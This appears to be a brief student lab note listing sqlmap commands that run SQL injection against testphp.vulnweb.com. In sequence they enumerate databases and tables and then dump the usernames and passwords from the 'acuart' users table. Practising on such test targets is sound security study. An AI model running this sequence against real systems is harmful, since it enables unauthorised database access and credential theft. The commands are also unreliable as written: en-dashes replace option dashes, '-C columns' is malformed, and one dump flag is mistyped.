# 3-2lab


sql cammods


sqlmap –u testphp.vulnweb.com/artists.php?artist=1 --dbs

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart --tables

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T users –C columns

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T users –C uname --dump

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T users –C pass –dump

